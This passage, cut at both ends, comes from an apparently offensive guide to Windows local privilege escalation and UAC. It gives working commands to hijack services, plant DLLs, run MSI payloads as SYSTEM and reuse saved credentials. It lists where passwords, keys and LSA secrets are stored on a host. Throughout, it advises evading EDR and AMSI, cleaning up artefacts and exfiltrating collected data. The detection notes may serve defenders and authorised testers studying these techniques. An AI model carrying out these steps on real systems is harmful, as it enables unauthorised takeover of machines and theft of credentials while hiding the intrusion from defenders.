} | Where-Object { $_.BinAcl -match 'Users|Everyone|Authenticated Users|INTERACTIVE|BUILTIN\\Users' -and $_.BinAcl -match 'Write|FullControl|Modify' }
```

`accesschk.exe` from Sysinternals is the direct tool and is Microsoft-signed, which sometimes matters under application control:

```cmd
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwqs "Authenticated Users" "C:\Program Files"
accesschk.exe -uwqs "Users" "C:\Program Files (x86)"
icacls "C:\Program Files\Vendor\App"
```

Exploitation, in decreasing order of noise:

```cmd
:: loudest: rewrite the service configuration
sc.exe config "$SERVICE" binPath= "C:\Windows\Tasks\payload.exe" obj= LocalSystem
sc.exe stop "$SERVICE" && sc.exe start "$SERVICE"

:: quieter: replace the binary in place, leave configuration untouched
move "C:\Program Files\Vendor\svc.exe" "C:\Program Files\Vendor\svc.exe.bak"
copy C:\Windows\Tasks\payload.exe "C:\Program Files\Vendor\svc.exe"
```

**Detection and opsec.** `sc config` produces Security event **4697** where service installation auditing is enabled and System event **7040** for a start-type change, and every EDR product treats service binary path modification as high severity. Binary replacement produces a file write to a program directory and, on the next start, a process with a known service name but an unknown hash, which reputation-based products catch on the hash alone. If you replace a binary, keep the original and restore it, because a broken service is a helpdesk ticket.

**Common mistake.** The space after `binPath=` in `sc.exe config` is mandatory. `binPath="x"` silently parses as something else and the command appears to succeed while changing nothing.

### Weak registry permissions on services

**What it is.** The service configuration lives in the registry, so write access to the service's key is equivalent to `SERVICE_CHANGE_CONFIG` even when the service object's own DACL is sound.

**Why it works.** The Service Control Manager reads `ImagePath`, `ObjectName`, and for svchost-hosted services `Parameters\ServiceDll`, from `HKLM\SYSTEM\CurrentControlSet\Services\<name>`. It does not re-validate that whoever wrote those values had service control rights. `ServiceDll` is the more useful of the two because the resulting DLL is loaded into a shared svchost process that is already running as SYSTEM and is not itself an unusual process.

```powershell
Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services' | ForEach-Object {
  $acl = Get-Acl $_.PSPath -ErrorAction SilentlyContinue
  if ($acl.AccessToString -match '(Users|Everyone|Authenticated Users|INTERACTIVE)[^\r\n]*(FullControl|Write|SetValue)') {
    [pscustomobject]@{ Key = $_.PSChildName; Access = $acl.AccessToString }
  }
}
```

Also check `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters` separately, because a permissive ACL is frequently applied to the subkey rather than the service key itself, and the recursive check is the one people skip.

**Detection and opsec.** Registry writes under the Services hive are watched closely. Sysmon events **12**, **13** and **14** cover key and value modification, and `ImagePath` and `ServiceDll` are in every reasonable Sysmon configuration's include list.

### DLL hijacking and search order

**What it is.** A privileged process loads a library by name rather than by full path, and you place a matching DLL somewhere the loader looks first.

**Why it works.** `LoadLibrary` with an unqualified name walks a defined order. With `SafeDllSearchMode` enabled, which is the default, the order is: DLLs already loaded in the process, the KnownDLLs list, the directory containing the executable, the system directory, the 16-bit system directory, the Windows directory, the current working directory, and finally each directory in `PATH`. Two consequences matter. First, the application's own directory beats `System32`, so a writable application directory is a hijack against every non-KnownDLL import. Second, KnownDLLs are pre-mapped section objects and cannot be hijacked at all, which rules out most of the interesting core libraries.

The productive variants:

- **Missing DLL, sometimes called a phantom DLL.** The process imports or delay-loads a library that is simply not present on the system, so every location in the search order is tried and fails. Any writable location in that order wins with no need to proxy exports.
- **Writable application directory.** The binary's own directory is writable by users, which is common for software installed outside `Program Files` and for anything installed per-user then run elevated.
- **Writable `PATH` entry.** Last in the order, but it catches every unqualified load that failed everywhere else, and a writable `PATH` directory affects every process on the system.
- **Side-by-side and manifest redirection.** An application whose activation context resolves an assembly from a writable location.
- **`.local` redirection.** Legacy DotLocal redirection, where a `program.exe.local` directory next to the binary takes precedence for redirected loads. Disabled in many configurations but still present on older builds.

**How to detect it.** Process Monitor with a filter on `Result is NAME NOT FOUND` and `Path ends with .dll` is the definitive method, and it needs administrative rights on the host you are researching on, which is why this is best done in a lab against the same software version rather than live. Statically, dump the import table and delay-load table and compare against what exists on the target. Live and unprivileged, invert it: enumerate every writable directory that appears in the search order and then work out which privileged process would reach it.

```powershell
# writable directories in the system PATH, the highest-leverage single check
$env:PATH -split ';' | Where-Object { $_ } | ForEach-Object {
  $p = $_.TrimEnd('\')
  if (Test-Path $p) {
    try {
      $t = Join-Path $p ([guid]::NewGuid().ToString('N') + '.tmp')
      [IO.File]::WriteAllText($t, '')
      Remove-Item $t -Force
      [pscustomobject]@{ Writable = $true; Path = $p }
    } catch { }
  }
}
```

An empirical write test is more reliable than parsing ACLs, because it accounts for inherited denies, integrity labels and effective permissions from nested group membership all at once. Use a random filename and delete it immediately.

**Exploitation.** The DLL must export what the loader expects or the load fails and often the process crashes, which is both a functional problem and a detection. The reliable pattern is a proxy DLL that forwards every export to the real library and runs your code from `DllMain` or from a single hooked export. Do the work off the loader lock: `DllMain` runs holding it, so create a thread or queue the work rather than doing anything that itself loads libraries.

**Detection and opsec.** Image loads from non-standard paths are Sysmon event **7** and a native EDR telemetry source, and an unsigned DLL loading into a signed Microsoft process is a strong signal. A signed DLL, even self-signed with a plausible subject, materially reduces this. The write to disk is usually the first thing seen, not the load.

**Failure modes.** `The specified module could not be found` for your own DLL means an import of yours is unresolvable on that host, typically because you built against a different runtime. Architecture mismatch produces a load failure with no useful message; a 32-bit DLL will not load into a 64-bit process, and `SysWOW64` versus `System32` redirection makes this easy to get wrong. If nothing loads at all, the DLL you targeted is in KnownDLLs.

### Missing patches and kernel exploits

**What it is.** A vulnerability in a kernel-mode or SYSTEM-context component that yields elevation directly.

**When it is worth it.** Rarely, and later than most operators reach for it. The honest calculus: a kernel exploit is a controlled crash of a shared component. If it fails, you get a bugcheck, the host reboots, your access is gone, a crash dump is generated and sent to the vendor, and the reboot itself is an incident-worthy event on a production server. Against that, every configuration-based path in this part is quieter, more reliable and reversible. Use a kernel exploit when the configuration surface is genuinely clean, you have exhausted credential theft, and you can accept losing the host.

Two further modern constraints. HVCI and VBS invalidate whole classes of exploitation technique by preventing the arbitrary code injection and page-table manipulation that older exploits rely on, so a public exploit that works on an unhardened build may fail on a hardened one at the same patch level. And public exploit binaries are among the most reliably signatured files in existence, so you are compiling from source with changes, not downloading a release.

```powershell
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 25 HotFixID, InstalledOn, Description
(Get-CimInstance Win32_OperatingSystem).Version
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | Select-Object ProductName, DisplayVersion, CurrentBuild, UBR
```

The build number plus UBR is the precise patch level and is what you correlate against a patch list. `Get-HotFix` misses cumulative-update detail on current Windows and is not a reliable sole source; `systeminfo` is worse. Correlate the full build string instead.

The durable local escalation bugs worth recognising by name, because they still appear on unmaintained hosts:

| Identifier | Component | Nature |
| --- | --- | --- |
| CVE-2021-36934 | Volume shadow copies and SAM ACLs | Non-admin read of SAM, SYSTEM and SECURITY hives via a shadow copy. Configuration bug, no crash risk, trivially reliable |
| CVE-2021-1675 / CVE-2021-34527 | Print Spooler | Driver installation abuse giving SYSTEM locally and RCE remotely |
| CVE-2022-21999 | Print Spooler | Directory-permission abuse in the spooler giving SYSTEM |
| CVE-2023-21746 | NTLM local reflection | Arbitrary file write as SYSTEM from a low-privileged context |
| CVE-2021-1732 | win32k | Kernel memory corruption, exploited in the wild, HVCI-sensitive |

`CVE-2021-36934` deserves special mention because it is not really a kernel exploit at all: it is a permissions mistake with no crash risk, and it is exactly the kind of thing worth checking before anything dangerous.

```cmd
:: check for the readable-SAM condition without exploiting it
icacls %windir%\System32\config\SAM
:: BUILTIN\Users:(I)(RX) in the output is the vulnerable state
```

### AlwaysInstallElevated

**What it is.** A policy that makes Windows Installer run MSI packages with SYSTEM privileges regardless of who launched them.

**Why it works.** The setting exists so that standard users can install approved software. The implementation does not restrict *which* MSI, so any package you author runs as SYSTEM. Both the machine-wide and the per-user value must be set to `1`; either alone does nothing, which is the detail that makes people report false positives.

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```cmd
msiexec /quiet /qn /i C:\Windows\Tasks\payload.msi
```

**Detection and opsec.** MSI installation is logged extensively: MsiInstaller events **1022**, **1033** and **11707** in the Application log, a package cached under `C:\Windows\Installer`, and an entry in the installed-products registry. It is also one of the few escalations that leaves a durable, easily-audited artefact, so clean up the cached package. Under AppLocker, the MSI rule collection may block this independently of the policy setting.

**Failure modes.** `This installation is forbidden by system policy` means only one of the two values is set, or `DisableMSI` is in force. A silent exit with no effect usually means your MSI is malformed; test it locally first.

### Scheduled task abuse

**What it is.** A task that runs as a privileged principal and whose action, working directory, or referenced script is under your control.

**Why it works.** A task definition names a principal and an action independently. The Task Scheduler validates that whoever *registers* a task may do so, but the action's target is resolved at run time with the principal's token. Anything writable along that resolution path is an escalation. The variants are: a writable action binary or script; an unquoted or relative action path; a writable working directory combined with an unqualified DLL or executable reference; an environment variable in the action path that you can influence; and, occasionally, a writable task definition file.

```powershell
Get-ScheduledTask | Where-Object { $_.Principal.UserId -and $_.Principal.RunLevel -eq 'Highest' -or $_.Principal.UserId -match 'SYSTEM|Administrator' } |
  ForEach-Object {
    foreach ($a in $_.Actions) {
      [pscustomobject]@{
        Task = $_.TaskPath + $_.TaskName
        User = $_.Principal.UserId
        RunLevel = $_.Principal.RunLevel
        Execute = $a.Execute
        Arguments = $a.Arguments
        WorkingDir = $a.WorkingDirectory
      }
    }
  } | Format-Table -AutoSize
```

```cmd
schtasks /query /fo LIST /v
```

Then test writability of every `Execute`, `Arguments` and `WorkingDirectory` path that came back, and of `C:\Windows\System32\Tasks\<TaskPath>` for the definition itself. Non-Microsoft tasks in the root task folder are the usual finding, because vendors and in-house scripts put them there.

**Verify it worked.** `Get-ScheduledTaskInfo -TaskName` gives `LastRunTime` and `LastTaskResult`, which tells you whether your action executed and what it returned without you needing to guess.

**Detection and opsec.** Task registration is Security event **4698** and Task Scheduler operational events **106**, **140** and **141**. *Modifying* an existing task is 4702, which is watched less consistently than 4698 by many detection rules, so abusing an existing task is quieter than registering a new one. Simply replacing the file the task already runs generates no scheduler event at all, only a file write, which is why it is the preferred variant.

### Startup folders and autorun entries

**What it is.** Escalation to another user, or to an administrator, by planting something that runs at their next logon.

**Why it works.** Logon autoruns execute in the security context of the user logging on, using the token they receive at logon. If that user is an administrator, the entry runs elevated when UAC's consent is not required, which for `HKLM\...\Run` entries under a default configuration means it runs with the filtered token, not the full one. That distinction matters: an `HKLM\Run` entry gives you a medium-integrity process as an administrator, which then needs a UAC bypass. The all-users startup folder behaves the same way.

```powershell
$autoruns = @(
  'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
  'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
  'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run',
  'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
  'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run'
)
foreach ($k in $autoruns) {
  if (Test-Path $k) {
    (Get-Item $k).Property | ForEach-Object { [pscustomobject]@{ Key = $k; Name = $_; Value = (Get-ItemProperty $k).$_ } }
    (Get-Acl $k).AccessToString
  }
}
Get-ChildItem 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp' -Force
icacls 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'
```

The two findings that pay are a writable `HKLM\...\Run` key and, far more often, an autorun entry whose *target binary* sits in a writable directory. The registry key itself is usually correctly ACL'd; the vendor's install directory is not.

**Detection and opsec.** Autorun persistence is the most heavily instrumented behaviour on Windows. Sysmon 12 and 13 on the Run keys, EDR autorun baselining, and every hunting query in existence. Waiting for a logon also means an unbounded delay. Treat this as a route to another user's context when you have no better option, not as a primary escalation.

### Stored credentials: Credential Manager, files, and the registry

This is where most real escalations come from. Not a clever exploit, someone's password in a file.

**Credential Manager and DPAPI.** Saved credentials live as DPAPI-encrypted blobs, and DPAPI's user master key is derived from the user's password, which means as that user you can decrypt them without knowing the password, because the key material is already unlocked in your session.

```cmd
cmdkey /list
```

```text
%APPDATA%\Microsoft\Credentials\            user credential blobs
%LOCALAPPDATA%\Microsoft\Credentials\       system-scoped credential blobs
%APPDATA%\Microsoft\Protect\<SID>\          user DPAPI master keys
%LOCALAPPDATA%\Microsoft\Vault\             Vault credential store
C:\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\Credentials\   SYSTEM credentials
```

`cmdkey /list` shows what exists including the target and username, and a `Domain:target=` entry with a `runas /savecred` alias is directly usable without decrypting anything:

```cmd
runas /savecred /user:$DOMAIN\$USER "C:\Windows\Tasks\payload.exe"
```

For the blobs themselves, decryption is a DPAPI operation: `SharpDPAPI` and Mimikatz's `dpapi::` and `vault::` modules do it as the user, and with domain admin the DPAPI domain backup key decrypts every user's blobs in the domain offline, which is the version of this that matters at scale. As SYSTEM, the machine-scoped blobs and the credentials of any user with a loaded profile are reachable. The full DPAPI mechanics, including the domain backup key, are in the companion credential extraction part of this Windows Post-Exploitation section; what matters here is that a `cmdkey` entry is an escalation lead.

**Registry.** Broad searches over the registry are slow and noisy but productive.

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f pwd /t REG_SZ /s
```

Specific keys that reliably hold credentials:

| Location | Contents |
| --- | --- |
| `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` | `DefaultUserName`, `DefaultDomainName`, `DefaultPassword`, `AutoAdminLogon` |
| `HKCU\Software\SimonTatham\PuTTY\Sessions` | Host, username, `ProxyPassword` in cleartext, key file paths |
| `HKCU\Software\Martin Prikryl\WinSCP 2\Sessions` | Session passwords under WinSCP's reversible obfuscation |
| `HKLM\SYSTEM\CurrentControlSet\Services\SNMP` | Community strings |
| `HKCU\Software\Microsoft\Terminal Server Client\Servers` | RDP history, a target list with usernames |
| `HKLM\SOFTWARE\RealVNC\vncserver`, `HKCU\Software\TightVNC\Server` | VNC passwords under a fixed, published DES key |
| `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` | `AlwaysInstallElevated` |
| `HKLM\SECURITY\Policy\Secrets` | LSA secrets: service account plaintexts, machine account password, cached `DefaultPassword`. Requires SYSTEM |

`AutoAdminLogon` with a plaintext `DefaultPassword` is still a live finding on kiosks, digital signage, industrial control workstations and imaging hosts. When the password has been set through the proper tooling it is stored as the `DefaultPassword` LSA secret instead of a registry string, which needs SYSTEM but is equally recoverable.

**Files.** The file-based credential surface is large enough to deserve a table.

| Path or pattern | What is in it |
| --- | --- |
| `C:\Windows\Panther\Unattend.xml`, `C:\Windows\Panther\Unattend\Unattend.xml` | Deployment answer file, local administrator password base64-encoded in `<Password><Value>` |
| `C:\Windows\System32\Sysprep\sysprep.xml`, `sysprep.inf`, `C:\Windows\Panther\Unattended.xml` | Same, older forms. `sysprep.inf` holds plaintext |
| `C:\unattend.xml`, `C:\Windows\Setup\Scripts\*` | Leftovers from imaging, often forgotten entirely |
| `web.config`, `app.config`, `appsettings.json`, `connectionStrings.config` | Database connection strings, API keys, service credentials |
| `C:\inetpub\wwwroot\**` | Application configuration, and `applicationHost.config` for pool identities |
| `*.ps1`, `*.bat`, `*.cmd`, `*.vbs` anywhere | Scheduled job and deployment scripts with embedded credentials |
| `%APPDATA%\..\WinSCP.ini`, `FileZilla\recentservers.xml`, `FileZilla\sitemanager.xml` | FTP and SFTP credentials, obfuscated at best |
| `%USERPROFILE%\.aws\credentials`, `.azure\`, `.config\gcloud\`, `.kube\config` | Cloud and cluster credentials, usually long-lived |
| `%USERPROFILE%\.ssh\`, `*.ppk`, `*.pem` | Private keys, plus `known_hosts` as a target list |
| `*.kdbx`, `*.kdb`, `*.psafe3`, `*.opvault` | Password manager databases. The master password is the problem, the keyfile often is not |
| `*.pfx`, `*.p12`, `*.jks`, `*.keystore` | Certificates with private keys, frequently with a weak or default password |
| `*.rdp`, `Default.rdp` | RDP connection files, sometimes with a DPAPI-protected password blob |
| `%LOCALAPPDATA%\Microsoft\Windows\WebCache\`, browser profile directories | Saved logins, cookies, session tokens |
| `C:\ProgramData\**` | Application data written by installers with permissive ACLs, a recurring source of both credentials and writable paths |

```powershell
# targeted rather than exhaustive, and much quieter than a whole-disk grep
Get-ChildItem C:\ -Include unattend.xml,unattended.xml,sysprep.inf,sysprep.xml,web.config,appsettings.json,*.kdbx,*.ppk,*.pem,*.pfx,id_rsa,.env `
  -Recurse -Force -ErrorAction SilentlyContinue | Select-Object FullName, Length, LastWriteTime
```

**Detection and opsec.** A recursive read of the whole system drive is one of the loudest things you can do: it generates enormous file-system telemetry, it is slow, and on a host with file access auditing it is unmistakable. Constrain by path and extension. Prefer the specific locations in the tables above, in a handful of calls, over one `Get-ChildItem C:\ -Recurse` with a broad include list. Registry-wide `reg query /s` searches similarly take minutes and produce a distinctive burst of registry reads.

### Group Policy Preference passwords

**What it is.** Credentials embedded in Group Policy Preferences XML on SYSVOL, encrypted with a static AES-256 key that Microsoft published in its own documentation.

**Why it works.** GPP needed to set local account passwords, map drives and configure services, so it stored a `cpassword` attribute encrypted with a fixed key so that every client could decrypt it. Every domain user can read SYSVOL, therefore every domain user could decrypt every GPP password. MS14-025 removed the ability to *create* new ones and hid the fields in the editor, but it did not delete existing policies, and existing policies replicate forever.

**Preconditions.** Any authenticated domain account, and SYSVOL read access, which is granted by default.

```bash
nxc smb $DC -u $USER -p $PASS -M gpp_password
nxc smb $DC -u $USER -p $PASS -M gpp_autologin
```

```cmd
findstr /S /I cpassword \\%USERDNSDOMAIN%\sysvol\%USERDNSDOMAIN%\policies\*.xml
```

The files that carry it are `Groups.xml`, `Services.xml`, `ScheduledTasks.xml`, `DataSources.xml`, `Printers.xml` and `Drives.xml`, under each policy's `Machine\Preferences\` or `User\Preferences\` directory.

**What it is worth now.** In a well-maintained estate, nothing: it has been the first thing every assessment checks for a decade. In estates with a domain built before 2014, in an acquired subsidiary's domain, or in a forest with a long-abandoned child domain, it is still a free local administrator password that is almost certainly still valid and almost certainly reused.

**Detection and opsec.** Reading SYSVOL is what every domain-joined machine does constantly, so the read itself is invisible. What is visible is a `findstr` recursing the whole policies tree, and any tool with `gpp` in its module name is only a name. Some estates deliberately plant a decoy `cpassword` as a canary, so treat a hit as a lead, not a conclusion, and test it from a context where an authentication failure is unremarkable.

### AutoLogon and cached domain credentials

`AutoAdminLogon` is covered in the registry table above. **Cached domain credentials** are a different thing and worth being precise about, because they are frequently overestimated.

When a domain user logs on interactively, Windows stores a verifier so the user can log on again while a domain controller is unreachable. That verifier is **MSCACHEV2**, also called DCC2 or "mscash2", stored in `HKLM\SECURITY\Cache` and readable only as SYSTEM. It is a PBKDF2-based derivation with a high iteration count, salted with the username. Three consequences: it is not usable for pass-the-hash, it is not usable for Kerberos, and it is slow to crack. Its value is entirely in the possibility that a cached account has a weak or reused password and that cracking it yields a plaintext, which is then usable everywhere.

```powershell
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' |
  Select-Object CachedLogonsCount, AutoAdminLogon, DefaultUserName, DefaultDomainName, DefaultPassword
```

`CachedLogonsCount` tells you how many distinct users' verifiers may be present. On a shared workstation or a jump host, ten cached logons means ten accounts to attempt, and one of them is often a support or administrative account that logged on once to fix something.

### Writable directories in the system PATH

Covered as a DLL hijack vector above, but it deserves separate treatment because it is broader than DLL loading. A writable `PATH` entry that precedes the legitimate location of a commonly invoked tool gives you execution whenever any process, at any privilege level, invokes that tool by bare name. Scheduled tasks, service startup scripts, logon scripts, monitoring agents and administrators typing `net`, `whoami` or `python` at a prompt all resolve through `PATH`.

The high-value case is a directory that is both writable and *early* in the machine `PATH`, because it precedes `C:\Windows\System32`. Check ordering, not just writability:

```powershell
(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment').Path -split ';'
```

Software that appends its own directory to the machine `PATH` and installs outside `Program Files` produces this constantly. So does anything installed to `C:\Tools`, `C:\Scripts`, `C:\Apps` or the root of a data volume.

### Symlinks, junctions and path redirection

**What it is.** A class rather than a bug: a privileged process performs a file operation on a path that you can redirect between the moment it decides the path is safe and the moment it uses it.

**Why it works.** Three NTFS and object-manager features combine. Directory **junctions** can be created by any user with write access to the mount point, unlike file symbolic links which require `SeCreateSymbolicLinkPrivilege` or developer mode. Object-manager **symbolic links** can be created inside object directories a user controls, notably `\RPC Control`, which lets you make an arbitrary NT path alias. **Hard links** let you create a second name for a file you can read, without needing write access to it. Together these turn "the privileged process writes into a directory I control" into "the privileged process writes wherever I choose".

The primitives you are hunting for, and what each converts into:

| Primitive held | Converted into |
| --- | --- |
| Arbitrary file write as SYSTEM | DLL hijack in `System32`, or overwrite a service binary |
| Arbitrary file *delete* as SYSTEM | Delete a file whose absence causes a privileged component to fall back to a location you control, or delete a DACL-protecting file. Repeatedly demonstrated against the Windows Installer rollback directory |
| Arbitrary file *move* as SYSTEM | Place a file you wrote elsewhere into a protected directory |
| Arbitrary DACL set as SYSTEM | Grant yourself write on a protected object |
| Arbitrary file *create* as SYSTEM | Plant a DLL or a task definition |

**How to find them.** Watch a privileged service with Process Monitor and look for any create, write, delete, rename or set-security operation on a path under `C:\Users`, `C:\ProgramData`, `C:\Windows\Temp`, or any per-user temp directory. Then check whether you can pre-create or replace the leaf with a junction. James Forshaw's `symboliclink-testing-tools` is the canonical toolkit for building the redirections and for the "bait and switch" timing, and is the right starting point rather than writing the plumbing yourself.

**Modern constraints.** Windows 10 1703 and later restrict non-administrative creation of file symbolic links unless developer mode is enabled, which removes the simplest variant. **Redirection Guard**, introduced in Windows 11 and Server 2022, blocks privileged processes from traversing junctions created by non-administrators, which kills a large fraction of this class for the components it protects. Both mitigations are per-process opt-in or version-gated, so the class is reduced rather than eliminated, and older or unhardened builds remain fully exposed.

**Detection and opsec.** Reparse point creation is not commonly audited, which makes this a genuinely quiet class. The consequence is not: a DLL appearing in `System32` or a modified service binary is detected on its own merits. Race-condition exploitation also tends to require many attempts, which produces repeated failed file operations by a system service and, in the worst case, a service crash.

### Privileged file operations more generally

The generalisation of the section above, worth stating separately because it also covers cases with no symlink involved. Any time a process holding privileges you do not have touches a filesystem or registry location you can influence, there is potentially an escalation, even without redirection. Examples of the shape:

- A service that reads a configuration file from `C:\ProgramData\Vendor\` where the ACL grants `Users` modify.
- An installer or updater that runs as SYSTEM and executes a downloaded or cached binary from a user-writable staging directory.
- A backup, log rotation or cleanup job running as SYSTEM that processes files in a directory you can write, where the processing involves executing, extracting or deserialising them.
- A monitoring agent that runs scripts from a plugins directory.
- A scheduled maintenance task that expands an environment variable you control.

Enumeration for this is not a command, it is a habit: for every non-Microsoft service and every privileged scheduled task you found earlier, look at where its files live and check the ACL. `C:\ProgramData` and any vendor directory outside `Program Files` are where this is found.

```powershell
# every directory under ProgramData and the drive root that grants write to ordinary users
Get-ChildItem C:\ProgramData, C:\ -Directory -Force -ErrorAction SilentlyContinue | ForEach-Object {
  $acl = (Get-Acl $_.FullName -ErrorAction SilentlyContinue).AccessToString
  if ($acl -match '(BUILTIN\\Users|Everyone|Authenticated Users|INTERACTIVE)[^\r\n]*(FullControl|Modify|Write)') {
    [pscustomobject]@{ Path = $_.FullName }
  }
}
```

### Enumeration tooling, honestly

The three tools the source notes list are all still the right tools conceptually and all effectively unusable in their published form against a monitored host.

| Tool | Form | Reality |
| --- | --- | --- |
| **winPEAS** (`winPEASx64.exe`, `winPEAS.bat`, `winPEASany.exe`) | Compiled C# and a batch variant | The most comprehensive and the most signatured. Detected on write by essentially every AV engine, by hash and by string content. The batch version fares slightly better but is still matched |
| **PrivescCheck** (`Invoke-PrivescCheck`) | PowerShell | Excellent coverage and deliberately built to avoid the worst of PowerUp's habits, but it is a large PowerShell script and AMSI matches it. Needs an AMSI bypass, obfuscation, or a rebuild from source with renamed symbols |
| **PowerUp** (`Invoke-AllChecks`) | PowerShell, part of PowerSploit | Unmaintained. AMSI signatures for `Invoke-AllChecks` and the individual function names are among the oldest in existence. Its individual functions, `Get-ServiceUnquoted`, `Get-ModifiableServiceFile`, `Get-ModifiablePath`, `Get-RegistryAutoLogon`, `Get-UnattendedInstallFile`, `Get-RegistryAlwaysInstallElevated`, remain a useful *checklist* of what to look for |
| **SharpUp**, **Seatbelt** | Compiled C#, GhostPack | Better suited to in-memory .NET execution through a C2 rather than dropping to disk. Still signatured by assembly name and by their distinctive output strings, so build from source with changes |
| **accesschk.exe** | Sysinternals, Microsoft-signed | Not malware, so it survives signature scanning and often survives application control. Its use is still visible as a process creation with a recognisable command line, and some EDR products flag it by name because of how consistently attackers use it |
| **icacls**, **sc**, **reg**, **schtasks**, `Get-CimInstance` | Built in | Never blocked, always available, no dropped file. Chained in bursts they are still a recon signature |

The practical approach, in order of preference:

1. **Ask only the questions you need.** You do not need a hundred-check report. You need: my privileges, non-Microsoft services and their binary ACLs, privileged scheduled tasks, `AlwaysInstallElevated`, writable `PATH` entries, and the credential locations. That is six or seven queries.
2. **Collect raw data on-host, analyse off-host.** Dump service configurations, ACLs, task definitions, autoruns and installed software to a single file with built-in cmdlets, exfiltrate it, and reason about it on your own machine. This turns dozens of suspicious commands into a handful of benign reads, and it means you are not iterating on the target.
3. **Do it in-process.** If your implant can execute .NET in memory, a purpose-built collector that calls the Win32 and WMI APIs directly generates no process creation events at all and is the single biggest reduction in signal available.
4. **Rebuild the public tools rather than running the releases.** Renaming a binary defeats nothing. Recompiling with changed strings, namespaces and output formats defeats a surprising amount.

```powershell
# minimal offline-triage collector using only built-ins, one file out
$out = "$env:TEMP\t.txt"
& {
  whoami /all
  Get-CimInstance Win32_Service | Select-Object Name, StartName, State, StartMode, PathName | Format-List
  Get-ScheduledTask | Select-Object TaskPath, TaskName, @{n='User';e={$_.Principal.UserId}}, @{n='Run';e={$_.Principal.RunLevel}}, @{n='Act';e={$_.Actions.Execute + ' ' + $_.Actions.Arguments}} | Format-List
  Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' | Select-Object DisplayName, DisplayVersion | Format-Table
  (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment').Path
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer 2>$null
  Get-HotFix | Select-Object HotFixID, InstalledOn | Format-Table
} *>&1 | Out-File -Encoding utf8 $out
```

Retrieve that file, delete it, and do the thinking somewhere the EDR is not watching.

## UAC and integrity levels

### What UAC actually is

**User Account Control is a token-splitting mechanism, not a privilege boundary.** When a user who is a member of an administrative group logs on, LSASS creates two tokens. The **full token** contains all the administrative group SIDs and privileges. The **filtered token** is a restricted copy in which the administrative SIDs are marked `USE_FOR_DENY_ONLY` and all but a handful of privileges are removed. Your shell, Explorer and everything you launch normally run with the filtered token at medium integrity. The two tokens are linked, so a process holding one can, with the right assistance, obtain the other.

Elevation is that assistance. When a process requests elevation, the **Application Information service** (`AppInfo`), running as SYSTEM, decides whether to grant it, obtains consent from the user through `consent.exe` on the secure desktop if required, and then creates the new process with the *linked full token* at high integrity. That is the whole mechanism. There is no separate authentication and no separate account.

Which is why bypassing UAC is not privilege escalation in the security-boundary sense. Microsoft has said so explicitly and repeatedly: UAC is a convenience and defence-in-depth feature intended to reduce the blast radius of accidental administrative actions, not to contain a hostile process running as the same user. The filtered and full tokens belong to the same user, in the same logon session, on the same desktop, sharing the same profile, the same `HKCU` and the same temp directory. A medium-integrity process can write to `HKCU`, which a high-integrity process of the same user reads. There is no isolation to break, only a design that assumes you are not trying.

Operationally, though, you have to do it constantly. The filtered token cannot open LSASS, cannot create or reconfigure a service, cannot write to `HKLM` outside a few keys, cannot read the `SECURITY` hive, cannot install a driver, cannot access `\\.\PhysicalDrive0`, and cannot touch another user's profile. Every one of those is something you need. So the correct framing is: UAC bypass is a **token conversion step**, cheap and expected, and it is a completely separate problem from escalating from a standard user, which is what the previous section was about. Confusing the two wastes time. Check for a deny-only Administrators SID first; if it is there, you need a bypass, not an exploit.

### The configuration determines what works

Five registry values under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` control the behaviour, and reading them tells you immediately which techniques are viable.

```powershell
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' |
  Select-Object EnableLUA, ConsentPromptBehaviorAdmin, ConsentPromptBehaviorUser, PromptOnSecureDesktop,
                FilterAdministratorToken, EnableInstallerDetection, EnableSecureUIAPaths, EnableVirtualization,
                LocalAccountTokenFilterPolicy
```

| Value | Meaning and consequence |
| --- | --- |
| `EnableLUA` = 0 | UAC is off entirely. Administrators receive unfiltered tokens at logon, so there is nothing to bypass. Also means every process the user runs is already high integrity |
| `ConsentPromptBehaviorAdmin` = 0 | Elevate without prompting. Any elevation request succeeds silently, so `runas`-style elevation is free |
| `ConsentPromptBehaviorAdmin` = 5 | Prompt for consent for non-Windows binaries. This is the default, and it is what makes the auto-elevation family work: Windows binaries marked for auto-elevation do not prompt at all |
| `ConsentPromptBehaviorAdmin` = 2 with `PromptOnSecureDesktop` = 1 | "Always notify", the highest slider position. Auto-elevation is disabled entirely, so the whole auto-elevating-binary family fails and every elevation shows a prompt on the secure desktop |
